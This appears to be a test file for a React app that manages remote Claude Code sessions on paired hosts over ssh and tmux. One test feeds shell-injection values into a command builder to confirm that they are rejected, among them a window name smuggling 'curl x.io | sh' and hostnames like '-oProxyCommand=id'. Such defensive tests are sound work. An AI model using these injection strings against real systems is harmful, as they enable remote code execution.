import type { RemoteAccount, RemoteHost, RemoteSession, RemoteTransferReport } from '@/lib/types'

import { screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import { ToastProvider } from '@/design'
import {
  copyToClipboard,
  openExternalUrl,
  remoteArchivedSessions,
  remoteArchiveSession,
  remoteCreateAccount,
  remoteDeleteAccount,
  remoteDeleteArchive,
  remoteHostInfo,
  remoteListAccounts,
  remoteListDirs,
  remoteListHosts,
  remoteListSessions,
  remoteLoginCancel,
  remoteLoginStart,
  remoteLoginSubmit,
  remoteLogout,
  remoteNewSession,
  remoteOpenInClaude,
  remoteOpenInTerminal,
  remotePairHost,
  remotePreviewPairing,
  remoteRenameAccount,
  remoteRenameSession,
  remoteRestartSession,
  remoteRestoreSession,
  remoteResumeSession,
  remoteStopSession,
  remoteTransferPlan,
  remoteTransferProgress,
  remoteTransferSession,
  remoteWindowKeys,
  remoteWindowScreen,
} from '@/lib/commands'
import { renderWithQuery } from '@/test/render-with-query'

import { PairHostDialog } from './pair-host-dialog'
import { attachCommand, RemoteAccountDetail } from './remote-account-detail'
import { RemoteHostSection } from './remote-host-section'
import { windowKeyFor } from './remote-window'
import { SignInDialog } from './sign-in-dialog'

vi.mock('@/lib/commands', async () => {
  const actual = await vi.importActual<typeof import('@/lib/commands')>('@/lib/commands')
  return {
    ...actual,
    copyToClipboard: vi.fn(async () => {}),
    remoteListHosts: vi.fn(),
    remoteHostInfo: vi.fn(),
    remoteListAccounts: vi.fn(),
    remoteListSessions: vi.fn(),
    remotePreviewPairing: vi.fn(),
    remotePairHost: vi.fn(),
    remoteListDirs: vi.fn(),
    remoteNewSession: vi.fn(),
    remoteResumeSession: vi.fn(),
    remoteRestartSession: vi.fn(),
    remoteStopSession: vi.fn(),
    remoteTransferPlan: vi.fn(),
    remoteTransferSession: vi.fn(),
    remoteTransferProgress: vi.fn(async () => null),
    remoteRenameSession: vi.fn(),
    remoteMergeMemory: vi.fn(),
    remoteArchiveSession: vi.fn(),
    remoteArchivedSessions: vi.fn(async () => []),
    remoteRestoreSession: vi.fn(),
    remoteDeleteArchive: vi.fn(),
    remoteCreateAccount: vi.fn(),
    remoteSetProfileColor: vi.fn(async () => host),
    remoteLogout: vi.fn(),
    remoteRenameAccount: vi.fn(),
    remoteDeleteAccount: vi.fn(),
    remoteLoginStart: vi.fn(),
    remoteLoginSubmit: vi.fn(),
    remoteLoginCancel: vi.fn(async () => {}),
    openExternalUrl: vi.fn(async () => {}),
    remoteWindowScreen: vi.fn(),
    remoteWindowKeys: vi.fn(),
    remoteOpenInTerminal: vi.fn(async () => null),
    remoteOpenInClaude: vi.fn(),
  }
})

const host: RemoteHost = {
  id: 'h1',
  label: 'xjopa1',
  hostname: 'xjopa1',
  addresses: ['100.110.48.97:7443'],
  fingerprint: 'ab'.repeat(32),
  clientId: 'c1',
  pairedAt: '2026-09-22T00:00:00Z',
  lastGoodAddress: '100.110.48.97:7443',
  profiles: { marcus2: { color: '#6b8db5' } },
}

function account(overrides: Partial<RemoteAccount> = {}): RemoteAccount {
  return {
    name: 'marcus2',
    isDefault: false,
    configDir: '/home/marcus/.claude-accounts/marcus2',
    account: { email: 'marcus@example.com', name: 'Marcus', organization: null, plan: 'Max' },
    signedIn: true,
    signedInUntil: new Date(Date.now() + 27.5 * 86_400_000).toISOString(),
    sessions: 3,
    runningSessions: 2,
    ...overrides,
  }
}

function session(overrides: Partial<RemoteSession> = {}): RemoteSession {
  return {
    id: 's1',
    cwd: '/home/marcus/brain',
    title: 'Brain-Dev-Server',
    named: true,
    lastPrompt: null,
    updatedAt: new Date().toISOString(),
    sizeBytes: 10,
    running: true,
    window: { session: '0', windowId: '@1', paneId: '%1' },
    remoteControl: true,
    bridgeSessionId: 'session_01abc',
    ...overrides,
  }
}

beforeEach(() => {
  vi.mocked(remoteListHosts).mockResolvedValue([host])
  vi.mocked(remoteHostInfo).mockResolvedValue({
    hostname: 'xjopa1',
    home: '/home/marcus',
    serverVersion: '0.0.0',
    apiVersion: 1,
    tmux: { version: 'tmux 3.0a', session: 'ai' },
    claude: { path: '/home/marcus/.local/bin/claude', version: '2.1.280 (Claude Code)' },
    accountsBase: '/home/marcus/.claude-accounts',
    includesDefault: false,
  })
  vi.mocked(remoteListAccounts).mockReset()
  vi.mocked(remoteListSessions).mockReset()
  vi.mocked(copyToClipboard).mockClear()
  vi.mocked(remoteOpenInTerminal).mockClear()
  vi.mocked(remoteStopSession).mockClear()
})

describe('RemoteHostSection', () => {
  it('lists the host’s profiles with their numbers and the CLI glyph', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account(), account({ name: 'marcus1', runningSessions: 0 })])
    const onSelect = vi.fn()
    const order = ['local-1', 'remote:h1:marcus2', 'remote:h1:marcus1']
    renderWithQuery(
      <RemoteHostSection
        host={host}
        selectedId={null}
        query=""
        shortcutIndexFor={(id) => order.indexOf(id)}
        onSelect={onSelect}
      />,
    )

    const section = await screen.findByRole('region', { name: 'Remote host xjopa1' })
    expect(await within(section).findByText('marcus2')).toBeInTheDocument()
    expect(within(section).getAllByLabelText('CLI')).toHaveLength(2)
    expect(within(section).queryByTitle('2 running')).not.toBeInTheDocument()
    expect(within(section).getByText('⌘2')).toBeInTheDocument()
    expect(within(section).getByText('⌘3')).toBeInTheDocument()
    await userEvent.setup().click(within(section).getByText('marcus1'))
    expect(onSelect).toHaveBeenCalledWith('remote:h1:marcus1')
    // Profiles are added from New Profile, not from the host's heading.
    expect(within(section).queryByRole('button', { name: /New profile/ })).toBeNull()
  })

  it('stays in the sidebar, saying so, when the host is offline', async () => {
    vi.mocked(remoteListAccounts).mockRejectedValue({
      kind: 'Remote',
      code: 'offline',
      message: 'xjopa1 can’t be reached.',
    })
    renderWithQuery(
      <RemoteHostSection host={host} selectedId={null} query="" shortcutIndexFor={() => -1} onSelect={vi.fn()} />,
    )
    expect(await screen.findByText('Offline')).toBeInTheDocument()
  })

  it('filters profiles with the sidebar search', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account(), account({ name: 'marcus1', account: null })])
    renderWithQuery(
      <RemoteHostSection
        host={host}
        selectedId={null}
        query="marcus1"
        shortcutIndexFor={() => -1}
        onSelect={vi.fn()}
      />,
    )
    expect(await screen.findByText('marcus1')).toBeInTheDocument()
    expect(screen.queryByText('marcus2')).not.toBeInTheDocument()
  })
})

describe('RemoteAccountDetail', () => {
  it('shows whose account it is and its sessions, with how to reach a running one', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session(),
      session({
        id: 's2',
        title: null,
        lastPrompt: 'fix the tests',
        running: false,
        window: null,
        remoteControl: false,
      }),
    ])
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )

    expect(await screen.findByText('27 days left')).toBeInTheDocument()
    expect(await screen.findByText('Brain-Dev-Server')).toBeInTheDocument()
    // Remote Control is connected: it can be opened in the Claude app.
    expect(screen.getByRole('button', { name: 'Open in Claude' })).toBeInTheDocument()
    expect(screen.getByText('fix the tests')).toBeInTheDocument()
    expect(await screen.findAllByText('~/brain')).toHaveLength(2)
    const runningList = screen.getByRole('list', { name: 'Running sessions' })
    expect(within(runningList).getByText('Brain-Dev-Server')).toBeInTheDocument()
    const previousList = screen.getByRole('list', { name: 'Previous sessions' })
    expect(within(previousList).getByText('fix the tests')).toBeInTheDocument()
    // Last, so it lines up with Stop in the running rows.
    const previousButtons = within(previousList).getAllByRole('button')
    expect(previousButtons[previousButtons.length - 1]).toHaveAccessibleName('Resume')
    expect(within(runningList).queryByRole('button', { name: /Resume/ })).toBeNull()

    // Only the running session has a window to open. Terminal opens it, and
    // copies the command too.
    expect(screen.getAllByRole('button', { name: 'Open its window' })).toHaveLength(1)
    const user = userEvent.setup()
    await user.click(screen.getByRole('button', { name: 'Open its window' }))
    const dialog = await screen.findByRole('dialog', { name: 'Brain-Dev-Server' })
    await user.click(within(dialog).getByRole('button', { name: /Open in Terminal/ }))
    expect(copyToClipboard).toHaveBeenCalledWith("ssh -t xjopa1 'tmux attach -t 0 \\; select-window -t @1'")
    expect(remoteOpenInTerminal).toHaveBeenCalledWith({
      hostId: 'h1',
      attachCommand: 'tmux attach -t 0 \\; select-window -t @1',
    })
  })

  it('opens a Remote Control session in the Claude app signed in as the profile', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session(),
      session({ id: 's2', title: 'No RC', remoteControl: false, bridgeSessionId: null }),
    ])
    vi.mocked(remoteOpenInClaude)
      .mockResolvedValueOnce({ app: 'Claude (Marcus2)', web: null, note: null })
      .mockResolvedValueOnce({ app: null, web: 'https://claude.ai/code/session_01abc', note: null })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    const buttons = await screen.findAllByRole('button', { name: 'Open in Claude' })
    expect(buttons).toHaveLength(1)
    await user.click(buttons[0])
    await waitFor(() =>
      expect(remoteOpenInClaude).toHaveBeenCalledWith({
        email: 'marcus@example.com',
        bridgeSessionId: 'session_01abc',
      }),
    )
    expect(await screen.findByText('Opened in Claude (Marcus2)')).toBeInTheDocument()

    await user.click(screen.getByRole('button', { name: 'Open in Claude' }))
    expect(await screen.findByText('No Claude app here is signed in as marcus@example.com.')).toBeInTheDocument()
  })

  it('spins while a session stops', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session()])
    let finishStop: (wasRunning: boolean) => void = () => {}
    vi.mocked(remoteStopSession).mockReturnValue(
      new Promise((resolve) => {
        finishStop = resolve
      }),
    )
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Stop' }))
    const dialog = await screen.findByRole('dialog', { name: 'Stop this session?' })
    await user.click(within(dialog).getByRole('button', { name: /^Stop/ }))

    const running = screen.getByRole('list', { name: 'Running sessions' })
    expect(await within(running).findByText('Stopping…')).toBeInTheDocument()
    expect(within(running).getByRole('button', { name: 'Stopping' })).toBeDisabled()

    finishStop(true)
    expect((await screen.findAllByText('Stopped')).length).toBeGreaterThan(0)
    expect(within(running).queryByText('Stopping…')).toBeNull()
  })

  it('says a session nothing was said in leaves the list once stopped', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ empty: true, lastPrompt: null })])
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Stop' }))
    const dialog = await screen.findByRole('dialog', { name: 'Stop this session?' })
    expect(within(dialog).getByText(/nothing to resume: it leaves the list/)).toBeInTheDocument()
    expect(within(dialog).queryByText(/resume it from Previous/)).toBeNull()
  })

  it('says which running sessions wait on a restart to take the installed update', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session({ updatePending: true, claudeVersion: '2.1.280' }),
      session({ id: 's2', title: 'Current', updatePending: false, claudeVersion: '2.1.281' }),
    ])
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const running = await screen.findByRole('list', { name: 'Running sessions' })
    const badges = await within(running).findAllByText('Restart to update')
    expect(badges).toHaveLength(1)
    expect(badges[0].closest('span')).toHaveAttribute('title', expect.stringContaining('2.1.280'))
    expect(screen.getByRole('button', { name: /Restart all · 1 to update/ })).toBeInTheDocument()
  })

  it('stops a running session once asked to, and restarts one', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session()])
    vi.mocked(remoteStopSession).mockResolvedValue(true)
    vi.mocked(remoteRestartSession).mockResolvedValue({
      window: { session: 'ai', windowId: '@7', paneId: '%7' },
      alreadyRunning: false,
      sessionId: 's1',
      remoteControlName: 'Brain-Dev-Server',
      attention: null,
      attachCommand: 'tmux attach -t ai \\; select-window -t @7',
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()

    await user.click(await screen.findByRole('button', { name: 'Stop' }))
    const dialog = await screen.findByRole('dialog', { name: 'Stop this session?' })
    expect(remoteStopSession).not.toHaveBeenCalled()
    await user.click(within(dialog).getByRole('button', { name: /^Stop/ }))
    await waitFor(() =>
      expect(remoteStopSession).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2', sessionId: 's1' }),
    )

    await user.click(screen.getByRole('button', { name: 'Restart' }))
    await waitFor(() =>
      expect(remoteRestartSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's1',
        trustFolder: true,
      }),
    )
    expect(await screen.findByText('Restarted on xjopa1')).toBeInTheDocument()
  })

  it('restarts every running session, one after another, once asked to', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session(),
      session({ id: 's2', title: 'Second', window: { session: 'mine', windowId: '@2', paneId: '%2' } }),
    ])
    vi.mocked(remoteRestartSession).mockReset()
    vi.mocked(remoteRestartSession).mockResolvedValue({
      window: { session: 'ai', windowId: '@9', paneId: '%9' },
      alreadyRunning: false,
      sessionId: 's1',
      remoteControlName: null,
      attention: null,
      attachCommand: 'tmux attach -t ai \\; select-window -t @9',
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: /Restart all/ }))
    const dialog = await screen.findByRole('dialog', { name: 'Restart 2 running sessions?' })
    await user.click(within(dialog).getByRole('button', { name: /Restart all/ }))
    await waitFor(() => expect(remoteRestartSession).toHaveBeenCalledTimes(2))
    expect(vi.mocked(remoteRestartSession).mock.calls.map(([input]) => input.sessionId)).toEqual(['s1', 's2'])
    expect(await screen.findByText('Restarted 2 sessions on xjopa1')).toBeInTheDocument()
  })

  it('passes on what Terminal is going to ask, and says why when ssh can’t get in', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session()])
    vi.mocked(remoteOpenInTerminal).mockResolvedValueOnce("Terminal will ask for xjopa1's password.")
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Open its window' }))
    const dialog = await screen.findByRole('dialog', { name: 'Brain-Dev-Server' })
    await user.click(within(dialog).getByRole('button', { name: /Open in Terminal/ }))
    expect(await screen.findByText("Terminal will ask for xjopa1's password.")).toBeInTheDocument()

    vi.mocked(remoteOpenInTerminal).mockRejectedValueOnce('xjopa1 only accepts SSH keys, and none of this Mac’s.')
    await user.click(within(dialog).getByRole('button', { name: /Open in Terminal/ }))
    expect(await screen.findByText('Could not open Terminal.')).toBeInTheDocument()
  })

  it('exits a running session and moves it to another profile once its questions are answered', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account(), account({ name: 'home' })])
    vi.mocked(remoteListSessions).mockResolvedValue([session()])
    vi.mocked(remoteTransferPlan).mockResolvedValue({
      sessionId: 's1',
      source: 'marcus2',
      destination: 'home',
      title: 'Brain-Dev-Server',
      cwd: '/home/marcus/brain',
      items: [
        { path: 'projects/-brain/s1', action: 'copy' },
        { path: 'projects/-brain/s1.jsonl', action: 'replace' },
      ],
      destinationNewer: false,
      memory: [
        { path: 'new.md', action: 'add', newer: 'source', sourceText: null, destinationText: null },
        {
          path: 'rules.md',
          action: 'conflict',
          newer: 'source',
          sourceText: 'marcus2 rule',
          destinationText: 'home rule',
        },
      ],
      running: [{ account: 'marcus2', pid: 42, sessionId: 's1', cwd: '/home/marcus/brain', exact: true, window: null }],
      sourceBytes: 174_063_616,
      archiveBytes: 174_063_616,
    })
    let finishMove: (report: RemoteTransferReport) => void = () => {}
    vi.mocked(remoteTransferSession).mockReturnValue(
      new Promise((resolve) => {
        finishMove = resolve
      }),
    )
    vi.mocked(remoteTransferProgress).mockResolvedValue({
      steps: ['Stopping the session', 'Copying it to home', 'Starting it in home'],
      current: 1,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click((await screen.findAllByRole('button', { name: 'Move to another profile' }))[0])
    const dialog = await screen.findByRole('dialog', { name: 'Move to another profile' })
    expect(await within(dialog).findByText(/1 to copy, 1 to replace/)).toBeInTheDocument()
    const decision = within(dialog).getByText('memory/rules.md')
    // What needs deciding comes first, though the plan listed it second.
    expect(
      decision.compareDocumentPosition(within(dialog).getByText(/add\s+memory\/new\.md/)) &
        Node.DOCUMENT_POSITION_FOLLOWING,
    ).toBeTruthy()

    // It's running: the move exits it first, rather than asking to go ahead.
    expect(within(dialog).getByText(/Moving exits it first/)).toBeInTheDocument()
    expect(within(dialog).queryByRole('checkbox', { name: /Move anyway/ })).toBeNull()
    const move = within(dialog).getByRole('button', { name: /^Exit and move/ })
    expect(move).toBeEnabled()
    await user.click(within(dialog).getByRole('button', { name: "home's" }))
    await user.click(move)

    await waitFor(() =>
      expect(remoteTransferSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's1',
        request: {
          to: 'home',
          stopFirst: true,
          confirmRunning: false,
          replaceNewer: false,
          archiveSource: true,
          deleteSource: false,
          resume: true,
          trustFolder: true,
          memory: { 'rules.md': { take: 'destination' } },
          progressId: expect.any(String),
        },
      }),
    )
    // While it runs, the host says how far it has got.
    const progress = await within(dialog).findByRole('status', { name: 'Move progress' })
    expect(await within(progress).findByText('Copying it to home')).toHaveAttribute('aria-current', 'step')
    expect(within(progress).getByLabelText('Done')).toBeInTheDocument()
    const progressId = vi.mocked(remoteTransferSession).mock.calls[0][0].request.progressId
    expect(remoteTransferProgress).toHaveBeenCalledWith({ hostId: 'h1', progressId })

    finishMove({
      changed: true,
      backupDir: '/b',
      memory: ['added    memory/new.md', "kept     memory/rules.md  (home's)"],
      archivedTo: '/a',
      freedBytes: null,
      deleteError: null,
      launch: null,
      resumeError: null,
    })
    expect(await screen.findByText('Moved to home')).toBeInTheDocument()
  })

  it('deletes the copy left behind when asked to', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account(), account({ name: 'home' })])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ running: false, window: null, remoteControl: false })])
    vi.mocked(remoteTransferPlan).mockResolvedValue({
      sessionId: 's1',
      source: 'marcus2',
      destination: 'home',
      title: 'Brain-Dev-Server',
      cwd: '/home/marcus/brain',
      items: [{ path: 'projects/-brain/s1.jsonl', action: 'copy' }],
      destinationNewer: false,
      memory: [],
      running: [],
      sourceBytes: 174_063_616,
      archiveBytes: 174_063_616,
    })
    vi.mocked(remoteTransferSession).mockResolvedValue({
      changed: true,
      backupDir: null,
      memory: [],
      archivedTo: null,
      freedBytes: 174_063_616,
      deleteError: null,
      launch: null,
      resumeError: null,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click((await screen.findAllByRole('button', { name: 'Move to another profile' }))[0])
    const dialog = await screen.findByRole('dialog', { name: 'Move to another profile' })
    const choice = within(dialog).getByRole('group', { name: /The session on marcus2/ })
    // Archiving stays the default: it can be undone, and says what it keeps.
    expect(await within(choice).findByRole('radio', { name: /Archive it \(up to 166 MB\)/ })).toBeChecked()
    // Keeping both forks the session, and moving it back doesn't merge them.
    await user.click(within(choice).getByRole('radio', { name: /Keep it/ }))
    expect(within(choice).getByRole('note')).toHaveTextContent(/forks the session/)
    await user.click(within(choice).getByRole('radio', { name: /^Delete it/ }))
    expect(within(choice).queryByRole('note')).toBeNull()
    expect(
      within(choice).getByText(/other sessions in marcus2 may use them, and home has its own copies now/),
    ).toBeInTheDocument()
    await user.click(within(dialog).getByRole('button', { name: /^Move/ }))

    await waitFor(() =>
      expect(remoteTransferSession).toHaveBeenCalledWith(
        expect.objectContaining({
          request: expect.objectContaining({ archiveSource: false, deleteSource: true }),
        }),
      ),
    )
    expect((await screen.findAllByText(/Deleted the copy in marcus2\./)).length).toBeGreaterThan(0)
  })

  it('shows a moved session that is waiting from the profile it moved to', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account(), account({ name: 'home' })])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ running: false, window: null, remoteControl: false })])
    vi.mocked(remoteTransferPlan).mockResolvedValue({
      sessionId: 's1',
      source: 'marcus2',
      destination: 'home',
      title: null,
      cwd: '/home/marcus/brain',
      items: [{ path: 'projects/-brain/s1.jsonl', action: 'copy' }],
      destinationNewer: false,
      memory: [],
      running: [],
      sourceBytes: 2048,
      archiveBytes: 2048,
    })
    vi.mocked(remoteTransferSession).mockResolvedValue({
      changed: true,
      backupDir: null,
      memory: [],
      archivedTo: null,
      freedBytes: null,
      deleteError: null,
      launch: {
        window: { session: 'ai', windowId: '@16', paneId: '%16' },
        alreadyRunning: false,
        sessionId: 's1',
        remoteControlName: null,
        attention: { kind: 'trustPermissions', text: 'This folder pre-approves 10 tool permissions' },
        attachCommand: 'tmux attach -t ai \\; select-window -t @16',
      },
      resumeError: null,
    })
    vi.mocked(remoteWindowScreen).mockResolvedValue({
      text: 'Quick safety check',
      width: 80,
      height: 24,
      sessionId: null,
      remoteControl: false,
    })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Move to another profile' }))
    const dialog = await screen.findByRole('dialog', { name: 'Move to another profile' })
    await within(dialog).findByText(/1 to copy/)
    await user.click(within(dialog).getByRole('button', { name: /^Move/ }))
    await waitFor(() =>
      expect(remoteWindowScreen).toHaveBeenCalledWith({ hostId: 'h1', account: 'home', windowId: '@16' }),
    )
    expect(remoteWindowScreen).not.toHaveBeenCalledWith(expect.objectContaining({ account: 'marcus2' }))
  })

  it('deletes an archive for good once asked, saying what that frees', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    vi.mocked(remoteArchivedSessions).mockResolvedValue([
      {
        id: 's9',
        archive: '20260101-120000-archived',
        stamp: '20260101-120000',
        title: 'Old work',
        cwd: null,
        sizeBytes: 174_063_616,
      },
    ])
    vi.mocked(remoteDeleteArchive).mockResolvedValue(174_063_616)
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Archived 1 · 166 MB' }))
    const archived = screen.getByRole('list', { name: 'Archived sessions' })
    await user.click(within(archived).getByRole('button', { name: 'Delete' }))

    const dialog = await screen.findByRole('dialog', { name: 'Delete this archive?' })
    expect(within(dialog).getByText(/can't be restored/)).toBeInTheDocument()
    expect(remoteDeleteArchive).not.toHaveBeenCalled()
    await user.click(within(dialog).getByRole('button', { name: /Delete, freeing 166 MB/ }))
    await waitFor(() =>
      expect(remoteDeleteArchive).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's9',
        archive: '20260101-120000-archived',
      }),
    )
    expect((await screen.findAllByText('Deleted, freeing 166 MB')).length).toBeGreaterThan(0)
  })

  it('archives a previous session after asking, and restores an archived one', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ running: false, window: null, remoteControl: false })])
    vi.mocked(remoteArchiveSession).mockResolvedValue('/archived')
    vi.mocked(remoteArchivedSessions).mockResolvedValue([
      {
        id: 's9',
        archive: '20260101-120000-archived',
        stamp: '20260101-120000',
        title: 'Old work',
        cwd: null,
        sizeBytes: 174_063_616,
      },
    ])
    vi.mocked(remoteRestoreSession).mockResolvedValue('/restored')
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    const user = userEvent.setup()
    await user.click(await screen.findByRole('button', { name: 'Archive' }))
    const dialog = await screen.findByRole('dialog', { name: 'Archive this session?' })
    await user.click(within(dialog).getByRole('button', { name: /^Archive/ }))
    await waitFor(() =>
      expect(remoteArchiveSession).toHaveBeenCalledWith({ hostId: 'h1', account: 'marcus2', sessionId: 's1' }),
    )

    // What the archives take, so their size can be watched.
    await user.click(await screen.findByRole('button', { name: 'Archived 1 · 166 MB' }))
    const archived = screen.getByRole('list', { name: 'Archived sessions' })
    expect(within(archived).getByText('Old work')).toBeInTheDocument()
    expect(within(archived).getByText('166 MB')).toBeInTheDocument()
    await user.click(within(archived).getByRole('button', { name: /Restore/ }))
    await waitFor(() =>
      expect(remoteRestoreSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's9',
        archive: '20260101-120000-archived',
      }),
    )
  })

  it('says when the account is gone and when the host is not paired', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account({ name: 'other' })])
    vi.mocked(remoteListSessions).mockResolvedValue([])
    const { unmount } = renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    expect(await screen.findByText(/has no profile called marcus2 any more/)).toBeInTheDocument()
    unmount()
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="gone" account="marcus2" />
      </ToastProvider>,
    )
    expect(await screen.findByText('That host is no longer paired.')).toBeInTheDocument()
  })
})

describe('attachCommand', () => {
  it('attaches to the session’s tmux window over ssh', () => {
    expect(attachCommand(host, session())).toBe("ssh -t xjopa1 'tmux attach -t 0 \\; select-window -t @1'")
    expect(attachCommand(host, session({ window: null }))).toBeNull()
  })

  it('offers nothing to paste when the host names its window or itself in more than plain words', () => {
    const window = (name: string, windowId = '@1') => session({ window: { session: name, windowId, paneId: '%1' } })
    expect(attachCommand(host, window("0'; curl x.io | sh; '"))).toBeNull()
    expect(attachCommand(host, window('$(id)'))).toBeNull()
    expect(attachCommand(host, window('0', '@1; id'))).toBeNull()
    expect(attachCommand({ ...host, hostname: 'x; id' }, session())).toBeNull()
    expect(attachCommand({ ...host, hostname: '-oProxyCommand=id' }, session())).toBeNull()
  })
})

describe('PairHostDialog', () => {
  it('shows the code’s fingerprint before pairing, then pairs', async () => {
    vi.mocked(remotePreviewPairing).mockResolvedValue({
      addresses: ['100.110.48.97:7443'],
      fingerprint: '09:BB:8D',
    })
    vi.mocked(remotePairHost).mockResolvedValue(host)
    const onPaired = vi.fn()
    const onClose = vi.fn()
    renderWithQuery(<PairHostDialog open onClose={onClose} onPaired={onPaired} />)
    const user = userEvent.setup()

    const pair = screen.getByRole('button', { name: /^Pair/ })
    expect(pair).toBeDisabled()
    await user.type(screen.getByLabelText('Pairing code'), 'aip1.abc')
    expect(await screen.findByText('09:BB:8D')).toBeInTheDocument()
    await user.type(screen.getByLabelText(/Name/), 'Linux box')
    await user.click(pair)

    await waitFor(() => expect(remotePairHost).toHaveBeenCalledWith({ code: 'aip1.abc', label: 'Linux box' }))
    expect(onPaired).toHaveBeenCalledWith('xjopa1')
    expect(onClose).toHaveBeenCalled()
  })

  it('says what went wrong when the code is bad or pairing fails', async () => {
    vi.mocked(remotePreviewPairing).mockRejectedValue({
      kind: 'Validation',
      message: "validation error: that isn't an ai-profiles pairing code",
    })
    renderWithQuery(<PairHostDialog open onClose={vi.fn()} />)
    const user = userEvent.setup()
    await user.type(screen.getByLabelText('Pairing code'), 'hello')
    expect(await screen.findByText("that isn't an ai-profiles pairing code")).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /^Pair/ })).toBeDisabled()
  })
})

describe('RemoteAccountDetail — starting sessions', () => {
  const launch = {
    window: { session: 'ai', windowId: '@4', paneId: '%9' },
    alreadyRunning: false,
    sessionId: 's2',
    remoteControlName: null,
    attention: null,
    attachCommand: 'tmux attach -t ai \\; select-window -t @4',
  }

  it('resumes a session that isn’t running, and says where', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([
      session({ id: 's2', title: 'Old work', running: false, window: null, remoteControl: false }),
    ])
    vi.mocked(remoteResumeSession).mockResolvedValue(launch)
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    await userEvent.setup().click(await screen.findByRole('button', { name: /Resume/ }))
    await waitFor(() =>
      expect(remoteResumeSession).toHaveBeenCalledWith({
        hostId: 'h1',
        account: 'marcus2',
        sessionId: 's2',
        trustFolder: true,
      }),
    )
    expect(await screen.findByText('Resumed on xjopa1')).toBeInTheDocument()
  })

  it('shows the window when the session turns out to be running already', async () => {
    vi.mocked(remoteListAccounts).mockResolvedValue([account()])
    vi.mocked(remoteListSessions).mockResolvedValue([session({ id: 's2', running: false, window: null })])
    vi.mocked(remoteResumeSession).mockResolvedValue({ ...launch, alreadyRunning: true })
    renderWithQuery(
      <ToastProvider>
        <RemoteAccountDetail hostId="h1" account="marcus2" />
      </ToastProvider>,
    )
    await userEvent.setup().click(await screen.findByRole('button', { name: /Resume/ }))
